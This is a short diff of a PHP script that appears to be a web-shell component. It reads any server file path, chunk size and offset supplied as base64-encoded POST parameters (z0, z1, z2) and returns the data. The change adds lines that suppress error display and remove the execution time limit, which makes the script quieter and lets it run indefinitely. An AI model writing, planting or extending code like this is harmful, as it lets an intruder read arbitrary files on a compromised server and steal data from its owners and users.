@@ -1,4 +1,7 @@
 <?php
+
+@ini_set('display_errors','0');
+@set_time_limit(0);
 $szPath = base64_decode($_POST['z0']);
 $szChunkSize = base64_decode($_POST['z1']);
 $szOffset = base64_decode($_POST['z2']);
@@ -31,4 +34,5 @@ if (file_exists($szPath)) {
 } else {
     echo("0|ERROR://".$szPath."not existed!");
 }
+
 ?>
